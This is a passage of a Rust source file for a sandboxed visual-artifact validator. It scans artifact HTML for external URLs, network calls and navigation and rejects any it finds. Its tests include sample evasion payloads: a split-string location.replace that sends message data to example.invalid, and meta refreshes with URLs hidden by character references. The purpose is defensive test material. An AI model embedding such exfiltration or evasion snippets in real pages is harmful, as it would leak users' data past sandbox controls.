//! The visual artifact contract from PROPOSAL.md: the manifest, the static
//! validator that accepts or rejects an artifact's bytes, and the document the
//! `visual:` scheme serves. Pure functions only; reading the library and
//! answering requests lives in `artifacts.rs`.

use std::borrow::Cow;
use std::sync::LazyLock;

use regex::Regex;
use serde::{Deserialize, Serialize};

mod html_entities;

/// The postMessage protocol version, carried as `tutordoc` in every message.
pub const PROTOCOL_VERSION: u32 = 1;

/// The one third-party library an artifact may use.
pub const THREE_VENDOR: &str = "three@0.169.0";

/// What an artifact draws with. `three` is the only kind that gets the vendored
/// library injected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Kind {
    Svg,
    Canvas,
    Three,
}

/// Machine-checked metadata for one visual artifact directory. Fields the host
/// does not read are allowed and ignored.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Manifest {
    pub schema_version: u32,
    pub id: String,
    pub kind: Kind,
    #[serde(default = "default_entry")]
    pub entry: String,
    pub title: String,
    #[serde(default)]
    pub vendor: Vec<String>,
    #[serde(default = "default_height")]
    pub estimated_height: u32,
}

fn default_entry() -> String {
    "index.html".to_string()
}

fn default_height() -> u32 {
    420
}

/// Why an artifact will not be shown. The text names the offending reference.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rejection(pub String);

impl std::fmt::Display for Rejection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// The exact sandbox attribute for the visual iframe. Opaque origin: never add
/// allow-same-origin, forms, top navigation or popups.
pub fn visual_sandbox_attribute() -> &'static str {
    "allow-scripts"
}

/// An artifact's `index.html` larger than this is rejected before scanning.
const MAX_INDEX_BYTES: usize = 2 * 1024 * 1024;

/// XML namespace names are identifiers that are never fetched, and
/// `document.createElementNS` needs them, so they are the only allowed URLs.
const NAMESPACES: [&str; 6] = [
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1999/xhtml",
    "http://www.w3.org/1999/xlink",
    "http://www.w3.org/XML/1998/namespace",
    "http://www.w3.org/2000/xmlns/",
    "http://www.w3.org/1998/Math/MathML",
];

/// The module specifiers an artifact may import; both mean the vendored three.
const THREE_SPECIFIERS: [&str; 2] = ["three", "./three.module.min.js"];

fn re(pattern: &str) -> Regex {
    Regex::new(pattern).expect("validator patterns are static and valid")
}

static IMPORT_MAP: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)<script\b[^>]*\btype\s*=\s*["']?importmap"#));
static SCRIPT_SRC: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)<script\b[^>]*?\bsrc\s*=\s*["']?([^"'\s>]+)"#));
static LINK_HREF: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)<link\b[^>]*?\bhref\s*=\s*["']?([^"'\s>]+)"#));
static CSS_IMPORT: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)@import\s+(?:url\(\s*)?["']?([^"');\s]+)"#));
static CSS_URL: LazyLock<Regex> = LazyLock::new(|| re(r#"url\(\s*["']?([^"')\s]*)"#));
static ANY_URL: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)\b[a-z][a-z0-9+.\-]*://[^\s"'`<>)\]]*"#));
static PROTOCOL_RELATIVE: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?:["'`]|url\(\s*)(//[A-Za-z0-9][^\s"'`<>)]*)"#));
static NETWORK: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"\b(?:(fetch|sendBeacon|importScripts)\s*\(|new\s+(XMLHttpRequest|WebSocket|EventSource)\b)",
    )
});
static STATIC_IMPORT: LazyLock<Regex> =
    LazyLock::new(|| re(r#"\bimport\s*(?:[\w*{}\s,$]+?\s*from\s*)?["']([^"']+)["']"#));
static DYNAMIC_IMPORT: LazyLock<Regex> = LazyLock::new(|| re(r"\bimport\s*\(\s*([^)]*?)\s*\)"));
/// Assignment to `location`, `window.location` or `document.location`, including `.href`.
static NAV_ASSIGN: LazyLock<Regex> =
    LazyLock::new(|| re(r"\b((?:(?:window|document)\s*\.\s*)?location(?:\s*\.\s*href)?)\s*="));
/// `location.replace` and `location.assign`, with an optional `window.` or `document.` receiver.
static NAV_CALL: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\b((?:(?:window|document)\s*\.\s*)?location\s*\.\s*(?:replace|assign))\s*\(")
});
static WINDOW_OPEN: LazyLock<Regex> = LazyLock::new(|| re(r"\b(window\s*\.\s*open)\s*\("));
static FORM_ACTION: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)<form\b[^>]*\baction\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)"#));
static META_REFRESH: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)<meta\b[^>]*\bhttp-equiv\s*=\s*["']?\s*refresh\b[^>]*>"#));
static META_CONTENT: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)\bcontent\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)"#));

/// One reason to reject, kept with its byte offset so reasons read in page order.
struct Finding {
    at: usize,
    message: String,
}

/// Accept or reject an artifact from its bytes, before anything is displayed.
/// Character references are decoded first: an HTML parser decodes them in a
/// refresh URL, so a scan of the raw bytes would miss `https&#58;//`. The scan
/// is textual and fail-closed: a URL in a comment or a caption is rejected too,
/// because the contract is that the bytes reference no network.
pub fn validate(
    visual_id: &str,
    index_html: &str,
    manifest_json: &str,
) -> Result<Manifest, Rejection> {
    let manifest: Manifest = serde_json::from_str(manifest_json)
        .map_err(|e| Rejection(format!("manifest.json is not a valid manifest: {e}")))?;
    check_manifest(visual_id, &manifest)?;
    if index_html.len() > MAX_INDEX_BYTES {
        return Err(Rejection(format!(
            "index.html is {} bytes; the limit is {MAX_INDEX_BYTES}",
            index_html.len()
        )));
    }
    let decoded = decode_character_references(index_html);
    let findings = scan(&decoded, manifest.kind);
    if findings.is_empty() {
        return Ok(manifest);
    }
    let reasons: Vec<String> = findings
        .iter()
        .map(|f| format!("{} on line {}", f.message, line_of(&decoded, f.at)))
        .collect();
    Err(Rejection(reasons.join("; ")))
}

fn check_manifest(visual_id: &str, manifest: &Manifest) -> Result<(), Rejection> {
    if manifest.schema_version != 1 {
        return Err(Rejection(format!(
            "manifest.json schemaVersion {} is not supported; expected 1",
            manifest.schema_version
        )));
    }
    if manifest.id != visual_id {
        return Err(Rejection(format!(
            "manifest.json names visual \"{}\" but its folder is \"{visual_id}\"",
            manifest.id
        )));
    }
    if manifest.entry != "index.html" {
        return Err(Rejection(format!(
            "manifest.json entry \"{}\" must be index.html",
            manifest.entry
        )));
    }
    if let Some(other) = manifest.vendor.iter().find(|v| *v != THREE_VENDOR) {
        return Err(Rejection(format!(
            "manifest.json vendor \"{other}\" is not vendored; only {THREE_VENDOR} is"
        )));
    }
    Ok(())
}

fn scan(html: &str, kind: Kind) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut flag = |at: usize, message: String| findings.push(Finding { at, message });

    for m in IMPORT_MAP.find_iter(html) {
        flag(
            m.start(),
            "import map <script type=\"importmap\"> is not allowed; import from \"three\"".into(),
        );
    }
    for c in SCRIPT_SRC.captures_iter(html) {
        flag(
            c.get(0).unwrap().start(),
            format!(
                "script file \"{}\" is not allowed; inline the script",
                &c[1]
            ),
        );
    }
    for c in LINK_HREF.captures_iter(html) {
        if !c[1].starts_with("data:") {
            flag(
                c.get(0).unwrap().start(),
                format!("linked file \"{}\" is not allowed; inline it", &c[1]),
            );
        }
    }
    for c in CSS_IMPORT.captures_iter(html) {
        flag(
            c.get(0).unwrap().start(),
            format!("CSS @import of \"{}\" is not allowed", &c[1]),
        );
    }
    for c in CSS_URL.captures_iter(html) {
        let target = &c[1];
        if !(target.is_empty() || target.starts_with("data:") || target.starts_with('#')) {
            flag(
                c.get(0).unwrap().start(),
                format!("url(\"{target}\") loads a file; only data: and #fragment are allowed"),
            );
        }
    }
    for m in ANY_URL.find_iter(html) {
        if !NAMESPACES.contains(&m.as_str()) {
            flag(m.start(), format!("external URL \"{}\"", m.as_str()));
        }
    }
    for c in PROTOCOL_RELATIVE.captures_iter(html) {
        let m = c.get(1).unwrap();
        flag(m.start(), format!("external URL \"{}\"", m.as_str()));
    }
    for c in NETWORK.captures_iter(html) {
        let name = c.get(1).or_else(|| c.get(2)).unwrap().as_str();
        flag(
            c.get(0).unwrap().start(),
            format!("network call {name}( is not allowed; the artifact gets its data from init"),
        );
    }
    for m in META_REFRESH.find_iter(html) {
        let content = META_CONTENT
            .captures(m.as_str())
            .map(|c| unquote(&c[1]).to_string());
        let message = match content {
            Some(content) => format!("meta http-equiv=\"refresh\" content=\"{content}\""),
            None => "meta http-equiv=\"refresh\"".to_string(),
        };
        flag(m.start(), message);
    }
    for c in NAV_ASSIGN.captures_iter(html) {
        let whole = c.get(0).unwrap();
        // `location == x` compares; it does not navigate.
        if html[whole.end()..].starts_with('=') {
            continue;
        }
        flag(
            whole.start(),
            format!("navigation \"{}\" is not allowed", compact_js(&c[1])),
        );
    }
    for c in NAV_CALL.captures_iter(html) {
        flag(
            c.get(0).unwrap().start(),
            format!("navigation \"{}\" is not allowed", compact_js(&c[1])),
        );
    }
    for c in WINDOW_OPEN.captures_iter(html) {
        flag(
            c.get(0).unwrap().start(),
            format!("navigation \"{}\" is not allowed", compact_js(&c[1])),
        );
    }
    for c in FORM_ACTION.captures_iter(html) {
        flag(
            c.get(0).unwrap().start(),
            format!("form action \"{}\" is not allowed", unquote(&c[1])),
        );
    }
    for c in STATIC_IMPORT.captures_iter(html) {
        let statement = c.get(0).unwrap();
        if let Some(message) = import_problem(&c[1], kind, statement.as_str()) {
            flag(statement.start(), message);
        }
    }
    for c in DYNAMIC_IMPORT.captures_iter(html) {
        let statement = c.get(0).unwrap();
        let arg = &c[1];
        let literal = arg
            .strip_prefix(['"', '\''])
            .and_then(|rest| rest.strip_suffix(['"', '\'']));
        let message = match literal {
            Some(specifier) => import_problem(specifier, kind, statement.as_str()),
            None => Some(format!("computed import({arg}) is not allowed")),
        };
        if let Some(message) = message {
            flag(statement.start(), message);
        }
    }

    findings.sort_by_key(|f| f.at);
    findings.dedup_by(|later, earlier| {
        line_of(html, later.at) == line_of(html, earlier.at)
            && earlier.message.contains(quoted(&later.message))
    });
    findings
}

/// The first quoted reference in a message, used to drop a second finding
/// about the same reference on the same line.
fn quoted(message: &str) -> &str {
    message.split('"').nth(1).unwrap_or(message)
}

fn unquote(value: &str) -> &str {
    value
        .strip_prefix(['"', '\''])
        .and_then(|rest| rest.strip_suffix(['"', '\'']))
        .unwrap_or(value)
}

/// Drop whitespace so `window . location` is reported as `window.location`.
fn compact_js(reference: &str) -> String {
    reference.chars().filter(|ch| !ch.is_whitespace()).collect()
}

/// Decode HTML character references the way an attribute or text node would.
/// One pass, matching the parser: `&#38;colon;` stays the text `&colon;`.
fn decode_character_references(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut rest = input;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        let after = &rest[amp + 1..];
        match character_reference(after) {
            Some((consumed, replacement)) => {
                out.push_str(&replacement);
                rest = &after[consumed..];
            }
            None => {
                out.push('&');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// A reference starting just after `&`. Returns bytes consumed and the text.
fn character_reference(after: &str) -> Option<(usize, Cow<'static, str>)> {
    if after.starts_with('#') {
        return numeric_reference(after);
    }
    named_reference(after)
}

fn named_reference(after: &str) -> Option<(usize, Cow<'static, str>)> {
    let bytes = after.as_bytes();
    let mut name_len = 0;
    while name_len < bytes.len() && name_len < 32 && bytes[name_len].is_ascii_alphanumeric() {
        name_len += 1;
    }
    if name_len == 0 {
        return None;
    }
    if bytes.get(name_len) == Some(&b';') {
        let with_semi = &after[..=name_len];
        if let Some(replacement) = html_entities::named_replacement(with_semi) {
            return Some((name_len + 1, Cow::Borrowed(replacement)));
        }
    }
    for len in (1..=name_len).rev() {
        if let Some(replacement) = html_entities::named_replacement(&after[..len]) {
            return Some((len, Cow::Borrowed(replacement)));
        }
    }
    None
}

fn numeric_reference(after: &str) -> Option<(usize, Cow<'static, str>)> {
    let bytes = after.as_bytes();
    let hex = matches!(bytes.get(1), Some(b'x' | b'X'));
    let start = if hex { 2 } else { 1 };
    let mut end = start;
    while end < bytes.len() && end - start < 16 {
        let digit = bytes[end];
        let ok = if hex {
            digit.is_ascii_hexdigit()
        } else {
            digit.is_ascii_digit()
        };
        if !ok {
            break;
        }
        end += 1;
    }
    if end == start {
        return None;
    }
    let parsed = u64::from_str_radix(&after[start..end], if hex { 16 } else { 10 }).ok()?;
    let mut consumed = end;
    if bytes.get(end) == Some(&b';') {
        consumed += 1;
    }
    let ch = if parsed > u64::from(u32::MAX) {
        '\u{FFFD}'
    } else {
        numeric_char(parsed as u32)
    };
    Some((consumed, Cow::Owned(ch.to_string())))
}

/// HTML's numeric-character-reference replacements, including the Windows-1252
/// range an author can use to spell a character without writing it.
fn numeric_char(code: u32) -> char {
    let mapped = match code {
        0x00 => 0xFFFD,
        0x80 => 0x20AC,
        0x82 => 0x201A,
        0x83 => 0x0192,
        0x84 => 0x201E,
        0x85 => 0x2026,
        0x86 => 0x2020,
        0x87 => 0x2021,
        0x88 => 0x02C6,
        0x89 => 0x2030,
        0x8A => 0x0160,
        0x8B => 0x2039,
        0x8C => 0x0152,
        0x8E => 0x017D,
        0x91 => 0x2018,
        0x92 => 0x2019,
        0x93 => 0x201C,
        0x94 => 0x201D,
        0x95 => 0x2022,
        0x96 => 0x2013,
        0x97 => 0x2014,
        0x98 => 0x02DC,
        0x99 => 0x2122,
        0x9A => 0x0161,
        0x9B => 0x203A,
        0x9C => 0x0153,
        0x9E => 0x017E,
        0x9F => 0x0178,
        0xD800..=0xDFFF => 0xFFFD,
        n if n > 0x10FFFF => 0xFFFD,
        n => n,
    };
    char::from_u32(mapped).unwrap_or('\u{FFFD}')
}

fn import_problem(specifier: &str, kind: Kind, statement: &str) -> Option<String> {
    if specifier.contains("://") || specifier.starts_with("//") {
        return None; // reported as an external URL
    }
    if !THREE_SPECIFIERS.contains(&specifier) {
        return Some(format!(
            "import of \"{specifier}\" is not allowed; only \"three\" can be imported"
        ));
    }
    if kind != Kind::Three {
        return Some(format!(
            "import of \"{specifier}\" needs kind \"three\" in manifest.json"
        ));
    }
    if !supported_three_import(statement) {
        return Some(format!(
            "import of \"{specifier}\" uses an unsupported form \"{statement}\""
        ));
    }
    None
}

/// True when `statement` is one whole form in [`THREE_IMPORTS`].
fn supported_three_import(statement: &str) -> bool {
    THREE_IMPORTS.iter().copied().any(|form| {
        three_import_regex(form)
            .find(statement)
            .is_some_and(|found| found.as_str() == statement)
    })
}

fn line_of(text: &str, at: usize) -> usize {
    text[..at].matches('\n').count() + 1
}

/// The policy every served artifact runs under, sent as a response header so
/// the artifact's own markup cannot loosen it. Inline code only, no network,
/// no eval, no frames, no forms.
pub const ARTIFACT_CSP: &str = "default-src 'none'; script-src 'unsafe-inline'; \
style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; \
frame-src 'none'; worker-src 'none'; base-uri 'none'; form-action 'none'";

static THREE_GLOBAL: LazyLock<String> = LazyLock::new(|| {
    three_global_script(include_str!("../vendor/three.module.min.js"))
        .expect("the vendored three ends in one export list")
});

/// Import forms of the vendored three that the validator accepts and the
/// rewriter rewrites. Both walk this list, so a form cannot be allowed and
/// then left as a module import.
#[derive(Clone, Copy)]
enum ThreeImport {
    DefaultNamed,
    Namespace,
    Named,
    Default,
    Bare,
    Dynamic,
}

const THREE_IMPORTS: [ThreeImport; 6] = [
    ThreeImport::DefaultNamed,
    ThreeImport::Namespace,
    ThreeImport::Named,
    ThreeImport::Default,
    ThreeImport::Bare,
    ThreeImport::Dynamic,
];

fn three_re(pattern: &str) -> Regex {
    re(&pattern.replace("{spec}", r"(?:three|\./three\.module\.min\.js)"))
}

static THREE_DEFAULT_NAMED: LazyLock<Regex> = LazyLock::new(|| {
    three_re(r#"\bimport\s+([\w$]+)\s*,\s*\{([^}]*)\}\s*from\s*["']{spec}["']\s*;?"#)
});
static THREE_NAMESPACE: LazyLock<Regex> =
    LazyLock::new(|| three_re(r#"\bimport\s*\*\s*as\s+([\w$]+)\s+from\s*["']{spec}["']\s*;?"#));
static THREE_NAMED: LazyLock<Regex> =
    LazyLock::new(|| three_re(r#"\bimport\s*\{([^}]*)\}\s*from\s*["']{spec}["']\s*;?"#));
static THREE_DEFAULT: LazyLock<Regex> =
    LazyLock::new(|| three_re(r#"\bimport\s+([\w$]+)\s+from\s*["']{spec}["']\s*;?"#));
static THREE_BARE: LazyLock<Regex> =
    LazyLock::new(|| three_re(r#"\bimport\s*["']{spec}["']\s*;?"#));
static THREE_DYNAMIC: LazyLock<Regex> =
    LazyLock::new(|| three_re(r#"\bimport\s*\(\s*["']{spec}["']\s*\)"#));

fn three_import_regex(form: ThreeImport) -> &'static Regex {
    match form {
        ThreeImport::DefaultNamed => &THREE_DEFAULT_NAMED,
        ThreeImport::Namespace => &THREE_NAMESPACE,
        ThreeImport::Named => &THREE_NAMED,
        ThreeImport::Default => &THREE_DEFAULT,
        ThreeImport::Bare => &THREE_BARE,
        ThreeImport::Dynamic => &THREE_DYNAMIC,
    }
}

static FIRST_SCRIPT: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)<script\b|</body\s*>"));

/// Turn the vendored ES module into a classic script that defines
/// `globalThis.THREE`. A sandboxed iframe has an opaque origin, so WebKit
/// refuses to import even a sibling module from the same scheme (ticket 01,
/// `spike1-verdict-production.json`); inline classic code makes no request.
pub fn three_global_script(module_source: &str) -> Result<String, String> {
    let start = module_source
        .rfind("export{")
        .ok_or("no export list in the vendored module")?;
    let list = module_source[start + "export{".len()..]
        .trim_end()
        .strip_suffix("};")
        .ok_or("the export list is not the module's last statement")?;
    let fields: Vec<String> = list
        .split(',')
        .map(|item| match item.trim().split_once(" as ") {
            Some((local, exported)) => format!("{}:{}", exported.trim(), local.trim()),
            None => format!("{0}:{0}", item.trim()),
        })
        .collect();
    Ok(format!(
        "(function(){{\"use strict\";{}\nglobalThis.THREE=Object.freeze({{{}}});}})();",
        &module_source[..start],
        fields.join(",")
    ))
}

/// The document the `visual:` scheme serves for an accepted artifact: its own
/// markup with an error reporter, and for `three` the inlined library, placed
/// before its first script, and its three imports rewritten to read the global.
pub fn served_document(manifest: &Manifest, index_html: &str) -> String {
    let mut bootstrap = format!("<script>{}</script>", error_reporter(&manifest.id));
    let mut body = index_html.to_string();
    if manifest.kind == Kind::Three {
        bootstrap.push_str("<script>");
        bootstrap.push_str(&THREE_GLOBAL);
        bootstrap.push_str("</script>");
        body = rewrite_three_imports(&body);
    }
    let at = FIRST_SCRIPT.find(&body).map_or(body.len(), |m| m.start());
    body.insert_str(at, &bootstrap);
    body
}

fn rewrite_three_imports(html: &str) -> String {
    let mut html = html.to_string();
    for form in THREE_IMPORTS {
        let re = three_import_regex(form);
        html = re
            .replace_all(&html, |caps: &regex::Captures| {
                rewrite_three_import(form, caps)
            })
            .into_owned();
    }
    html
}

fn rewrite_three_import(form: ThreeImport, caps: &regex::Captures) -> String {
    match form {
        ThreeImport::DefaultNamed => format!(
            "const {} = globalThis.THREE; const {{ {} }} = globalThis.THREE;",
            &caps[1],
            named_bindings(&caps[2])
        ),
        ThreeImport::Namespace | ThreeImport::Default => {
            format!("const {} = globalThis.THREE;", &caps[1])
        }
        ThreeImport::Named => {
            format!(
                "const {{ {} }} = globalThis.THREE;",
                named_bindings(&caps[1])
            )
        }
        ThreeImport::Bare => String::new(),
        ThreeImport::Dynamic => "Promise.resolve(globalThis.THREE)".to_string(),
    }
}

fn named_bindings(list: &str) -> String {
    list.split(',')
        .map(str::trim)
        .filter(|name| !name.is_empty())
        .map(|name| name.replacen(" as ", ": ", 1))
        .collect::<Vec<_>>()
        .join(", ")
}

/// Reports an uncaught error as a protocol `error` message, so a broken
/// artifact falls back at once instead of waiting out the ready timeout.
fn error_reporter(visual_id: &str) -> String {
    let id = serde_json::to_string(visual_id)
        .expect("a string always serializes")
        .replace('<', "\\u003c");
    format!(
        "(function(){{function report(m){{parent.postMessage({{tutordoc:{PROTOCOL_VERSION},type:\"error\",visualId:{id},message:String(m)}},\"*\")}}\
addEventListener(\"error\",function(e){{report(e.message||\"script error\")}});\
addEventListener(\"unhandledrejection\",function(e){{var r=e.reason;report(r&&r.message?r.message:r)}})}})();"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest(id: &str, kind: &str) -> String {
        let vendor = if kind == "three" {
            r#"["three@0.169.0"]"#
        } else {
            "[]"
        };
        format!(
            r#"{{"schemaVersion":1,"id":"{id}","kind":"{kind}","entry":"index.html","title":"A cube","chapterId":"cells","dataSchema":{{}},"events":["ready"],"vendor":{vendor},"csp":"strict","estimatedHeight":360}}"#
        )
    }

    fn page(body: &str) -> String {
        format!("<!doctype html>\n<html>\n<head><style>body{{margin:0}}</style></head>\n<body>\n{body}\n</body>\n</html>\n")
    }

    const CUBE: &str = r#"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(#g)"/></svg>
<script type="module">
import * as THREE from "three";
const scene = new THREE.Scene();
parent.postMessage({ tutordoc: 1, type: "ready", visualId: "cube" }, "*");
</script>"#;

    fn reason(id: &str, kind: &str, body: &str) -> String {
        validate(id, &page(body), &manifest(id, kind))
            .expect_err("artifact must be rejected")
            .0
    }

    #[test]
    fn accepts_a_three_artifact_that_imports_the_vendored_library() {
        let accepted = validate("cube", &page(CUBE), &manifest("cube", "three")).expect("accepted");
        assert_eq!(accepted.kind, Kind::Three);
        assert_eq!(accepted.estimated_height, 360);
    }

    #[test]
    fn rejects_an_external_script_and_names_it() {
        let reason = reason(
            "cube",
            "three",
            r#"<script src="https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js"></script>"#,
        );
        assert!(
            reason.contains("https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js"),
            "{reason}"
        );
        assert!(reason.contains("line 5"), "{reason}");
    }

    #[test]
    fn rejects_an_external_font_and_names_it() {
        let reason = reason(
            "chart",
            "svg",
            r#"<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">"#,
        );
        assert!(
            reason.contains("https://fonts.googleapis.com/css2?family=Inter"),
            "{reason}"
        );
    }

    #[test]
    fn rejects_a_protocol_relative_font_in_css() {
        let reason = reason(
            "chart",
            "svg",
            "<style>@font-face{font-family:X;src:url(//fonts.gstatic.com/x.woff2)}</style>",
        );
        assert!(reason.contains("//fonts.gstatic.com/x.woff2"), "{reason}");
    }

    #[test]
    fn rejects_a_cdn_import_map() {
        let reason = reason(
            "cube",
            "three",
            r#"<script type="importmap">{"imports":{"three":"./three.module.min.js"}}</script>"#,
        );
        assert!(reason.contains("importmap"), "{reason}");
    }

    #[test]
    fn rejects_a_remote_fetch() {
        let reason = reason(
            "chart",
            "svg",
            "<script>fetch('/data.json').then(r => r.json())</script>",
        );
        assert!(reason.contains("fetch("), "{reason}");
    }

    #[test]
    fn rejects_a_relative_stylesheet_and_a_relative_script() {
        let css = reason(
            "chart",
            "svg",
            r#"<link rel="stylesheet" href="style.css">"#,
        );
        assert!(css.contains("style.css"), "{css}");
        let js = reason("chart", "svg", r#"<script src="chart.js"></script>"#);
        assert!(js.contains("chart.js"), "{js}");
    }

    #[test]
    fn rejects_importing_anything_but_three() {
        let reason = reason(
            "cube",
            "three",
            "<script type=\"module\">import { f } from './util.js';</script>",
        );
        assert!(reason.contains("./util.js"), "{reason}");
    }

    #[test]
    fn rejects_three_in_an_artifact_that_did_not_declare_it() {
        let reason = reason(
            "chart",
            "svg",
            "<script type=\"module\">import * as THREE from 'three';</script>",
        );
        assert!(reason.contains("three"), "{reason}");
    }

    #[test]
    fn rejects_a_manifest_that_names_another_artifact() {
        let rejected = validate("cube", &page(CUBE), &manifest("sphere", "three"))
            .unwrap_err()
            .0;
        assert!(
            rejected.contains("sphere") && rejected.contains("cube"),
            "{rejected}"
        );
    }

    #[test]
    fn rejects_an_unvendored_library_in_the_manifest() {
        let json = manifest("cube", "three").replace("three@0.169.0", "d3@7.9.0");
        let rejected = validate("cube", &page(CUBE), &json).unwrap_err().0;
        assert!(rejected.contains("d3@7.9.0"), "{rejected}");
    }

    #[test]
    fn rejects_a_manifest_that_is_not_json() {
        let rejected = validate("cube", &page(CUBE), "{ not json").unwrap_err().0;
        assert!(rejected.contains("manifest.json"), "{rejected}");
    }

    #[test]
    fn a_valid_manifest_is_accepted_and_the_failing_example_shape_is_refused() {
        // Complete valid manifest generated from real required fields
        let valid = r#"{
            "schemaVersion": 1,
            "id": "pue-cooling-simulator",
            "kind": "canvas",
            "title": "Hyperscale PUE and Cooling Efficiency Simulator"
        }"#;
        let manifest = validate("pue-cooling-simulator", &page("<canvas></canvas>"), valid)
            .expect("valid manifest must be accepted");
        assert_eq!(manifest.schema_version, 1);
        assert_eq!(manifest.id, "pue-cooling-simulator");
        assert_eq!(manifest.kind, Kind::Canvas);
        assert_eq!(
            manifest.title,
            "Hyperscale PUE and Cooling Efficiency Simulator"
        );
        assert_eq!(manifest.entry, "index.html");
        assert_eq!(manifest.estimated_height, 420);

        // Failing example shape: only id, title, and description (missing schemaVersion and kind)
        let failing = r#"{
            "id": "pue-cooling-simulator",
            "title": "Hyperscale PUE and Cooling Efficiency Simulator",
            "description": "Interactive thermodynamic and electrical simulation comparing traditional data center infrastructure against Google hyperscale architectures."
        }"#;
        let rejected = validate("pue-cooling-simulator", &page("<canvas></canvas>"), failing)
            .expect_err("manifest missing schemaVersion and kind must be refused")
            .0;
        assert!(
            rejected.contains("manifest.json is not a valid manifest"),
            "{rejected}"
        );
        assert!(rejected.contains("missing field"), "{rejected}");
    }

    #[test]
    fn sandbox_attribute_is_exactly_allow_scripts() {
        assert_eq!(visual_sandbox_attribute(), "allow-scripts");
    }

    fn accepted(id: &str, kind: &str, body: &str) -> (Manifest, String) {
        let html = page(body);
        (
            validate(id, &html, &manifest(id, kind)).expect("accepted"),
            html,
        )
    }

    #[test]
    fn the_vendored_module_becomes_a_classic_script_that_defines_three() {
        let script = three_global_script("const a=1,b=2;export{a as A,b};").unwrap();
        assert!(!script.contains("export"), "{script}");
        assert!(
            script.contains("globalThis.THREE=Object.freeze({A:a,b:b})"),
            "{script}"
        );
        assert!(
            script.starts_with("(function(){\"use strict\";"),
            "{script}"
        );
    }

    #[test]
    fn the_real_vendored_three_converts_and_keeps_its_revision() {
        let script = three_global_script(include_str!("../vendor/three.module.min.js")).unwrap();
        assert!(
            script.contains("REVISION:t"),
            "the revision export survives"
        );
        assert!(
            script.contains("WebGLRenderer:rc"),
            "the renderer export survives"
        );
        assert!(!script.contains("export{"));
    }

    #[test]
    fn a_three_artifact_is_served_with_three_inlined_and_its_import_rewritten() {
        let (manifest, html) = accepted("cube", "three", CUBE);
        let served = served_document(&manifest, &html);
        assert!(!served.contains(r#"from "three""#), "the import is gone");
        assert!(
            served.contains("const THREE = globalThis.THREE;"),
            "the import reads the global"
        );
        let three = served
            .find("globalThis.THREE=Object.freeze(")
            .expect("three is inlined");
        let artifact = served.find("const scene").unwrap();
        assert!(three < artifact, "three runs before the artifact's script");
        assert!(
            served.len() > 680_000,
            "the whole vendored source is inlined"
        );
    }

    #[test]
    fn named_and_dynamic_three_imports_are_rewritten() {
        let body = "<script type=\"module\">import { Scene, Mesh as M } from './three.module.min.js';\nconst T = await import(\"three\");</script>";
        let (manifest, html) = accepted("cube", "three", body);
        let served = served_document(&manifest, &html);
        assert!(
            served.contains("const { Scene, Mesh: M } = globalThis.THREE;"),
            "{served:.200}"
        );
        assert!(served.contains("const T = await Promise.resolve(globalThis.THREE);"));
    }

    #[test]
    fn an_svg_artifact_gets_the_error_reporter_but_not_three() {
        let body =
            "<script>parent.postMessage({tutordoc:1,type:'ready',visualId:'chart'},'*')</script>";
        let (manifest, html) = accepted("chart", "svg", body);
        let served = served_document(&manifest, &html);
        assert!(!served.contains("globalThis.THREE"));
        let reporter = served
            .find("addEventListener(\"error\"")
            .expect("error reporter injected");
        assert!(reporter < served.find("type:'ready'").unwrap());
        assert!(served.contains(r#"visualId:"chart""#), "{served}");
    }

    #[test]
    fn rejects_a_refresh_whose_url_is_hidden_by_a_character_reference() {
        for entity in ["&#58;", "&#x3a;", "&colon;"] {
            let body = format!(
                r#"<meta http-equiv="refresh" content="0;url=https{entity}//example.invalid/x">"#
            );
            let reason = reason("chart", "svg", &body);
            assert!(
                reason.contains("https://example.invalid/x"),
                "{entity} must be decoded and the url named: {reason}"
            );
        }
    }

    #[test]
    fn rejects_a_meta_refresh_outright() {
        let reason = reason("chart", "svg", r#"<meta content="0" http-equiv="refresh">"#);
        assert!(
            reason.contains("refresh"),
            "a refresh with no url is still navigation: {reason}"
        );
    }

    #[test]
    fn rejects_a_split_string_location_replace() {
        let body = r#"<script>
const host = "example.invalid";
location.replace("https:/" + "/" + host + "/?d=" + encodeURIComponent(JSON.stringify(e.data)));
</script>"#;
        let reason = reason("chart", "svg", body);
        assert!(
            reason.contains("location.replace"),
            "the call is the reference, even when the url is split: {reason}"
        );
    }

    #[test]
    fn rejects_location_assignment_window_open_and_a_form_action() {
        let cases = [
            (
                r#"<script>window.location = "https:/" + "/" + host;</script>"#,
                "window.location",
            ),
            (
                r#"<script>document.location = "https:/" + "/" + host;</script>"#,
                "document.location",
            ),
            (
                r#"<script>location.href = "https:/" + "/" + host;</script>"#,
                "location.href",
            ),
            (
                r#"<script>location.assign("https:/" + "/" + host);</script>"#,
                "location.assign",
            ),
            (
                r#"<script>window.open("https:/" + "/" + host);</script>"#,
                "window.open",
            ),
